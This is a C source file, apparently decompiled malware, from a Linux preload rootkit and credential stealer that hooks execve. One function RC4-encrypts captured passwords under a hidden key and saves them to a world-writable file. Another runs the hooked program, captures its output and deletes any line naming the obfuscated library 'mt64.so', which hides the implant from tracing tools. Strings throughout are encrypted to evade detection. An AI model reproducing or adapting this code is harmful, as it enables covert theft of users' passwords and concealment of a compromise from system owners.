#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/stat.h>
#include <sys/wait.h>

#include "hooks.h"
#include "rc4.h"
#include "utils.h"

size_t strstrmem(char *s1, size_t len, char *s2) {
  int j = 0;

  for (size_t i = 0; i < len; i++) {
    if (s1[i] == s2[j]) {
      j++;
      if (s2[j] == '\0')
        return 1;
    }
    else j = (s1[i] == *s2);
  }

  return 0;
}

void erasefree(char *str) {
  if (str) {
    memset(str, 0, strlen(str));
    free(str);
  }
}

#define PASSWD_KEY_ENC "\x34\xB7\x93\x4D\xF4\x59\x89\xDF\xB4" \
                       "\x3C\x43\xF2\x61\x36"

char *savepasswd(char *path, char *passwd) {
  char passwd_key[16];
  char passwd_key2[16];
  int fd;
  int passwd_len;

  fd = openfile(path);
  if (fd == -1)
    return (char *)-1;

  passwd_len = strlen(passwd);
  // "caixauniqsearch"
  strcpy(passwd_key, PASSWD_KEY_ENC);
  rc4(key, passwd_key, 15);
  rc4(passwd_key, passwd, passwd_len);
  if (!search_line(fd, passwd, passwd_len)) {
    write(fd, passwd, passwd_len);
    write(fd, "\0\0\0\0", 4);
  }

  close(fd);
  strcpy(passwd_key2, PASSWD_KEY_ENC);
  return rc4(rc4(key, passwd_key2, 15), passwd, passwd_len);
}

int openfile(char *path) {
  int fd = open(path, O_RDWR);
  if (fd == -1) {
    fd = open(path, O_NONBLOCK | O_RDWR, 0644);
    fchmod(fd, 0666);
  }
  return fd;
}

int search_line(int fd, char *str, int len) {
  char buf[512];
  int j = 0;
  int v11 = 0;
  int v12 = 0;

  for (ssize_t read_count = read(fd, buf, 512);
       /* internal condition */;
       read_count = read(fd, buf, 512)) {
    // nothing left to read
    if (read_count <= 0)
      break;

    for (ssize_t i = 0; i < read_count; i++) {
      if (v12 && buf[i] != '\0') {
        v11 = 1;
      }
      else if (!v12 || buf[i]) {
        if (buf[i] != str[j++] || len == j) {
          v12 = 1;
        }
      }
      else if (++v11 == 4) {
        if (len == j)
          return 1;
        v11 = 0;
        v12 = 0;
        j = 0;
      }
    }
  }
  return 0;
}

char *strchr_reverse(char *str, char c) {
  while (*str) {
    if (*str == c)
      return str;
    str--;
  }

  return NULL;
}

extern execve_fn orig_execve;
#define MT64_SO_ENC "\x3A\xA2\xCC\x01\xBB\x5F\x88"

int fake_trace_objects(const char *pathname, char *const argv[],
                       char *const envp[]) {
  int status;
  int pipefd[2];
  char mt64_so[8];
  int v12;
  int size;
  int readc;
  int i;
  char *buf;
  pid_t pid;
  char *mt64_substr;
  char *linebreak_pos;
  char *linebreak_pos_rv;

  pipe(pipefd);
  pid = fork();
  if (pid == 0) {
    close(pipefd[0]);
    dup2(pipefd[1], 1);
    dup2(pipefd[1], 2);
    if (pipefd[1] > 2)
      close(pipefd[1]);

    orig_execve(pathname, argv, envp);
    exit(errno);
  }
  if (pid == -1)
    return -1;

  close(pipefd[1]);
  size = 1024 + 1;
  i = 1;
  buf = malloc(1024 + 1);
  buf[0] = '\0';
  while (1) {
    readc = read(pipefd[0], &buf[i], size - 1 - i);
    if (readc <= 0)
      break;
    i += readc;
    if (size - 1 <= i) {
      size += 1024;
      // really not the proper way of using realloc
      buf = realloc(buf, size);
    }
  }

  close(pipefd[0]);
  buf[i] = '\0';
  // "mt64.so"
  strcpy(mt64_so, MT64_SO_ENC);
  mt64_substr = strstr(&buf[1], rc4(key, mt64_so, 7));
  if (mt64_substr) {
    linebreak_pos = strchr(mt64_substr, '\n');
    linebreak_pos_rv = strchr_reverse(mt64_substr, '\n');
    if (linebreak_pos_rv == NULL)
      linebreak_pos_rv = &buf[1];
    strcpy(linebreak_pos_rv, linebreak_pos);
  }

  printf("%s", &buf[1]);
  free(buf);
  waitpid(pid, &status, 0);
  if (status == 0)
    exit(0);

  errno = (status & 0xFF00) >> 8;
  return -1;
}
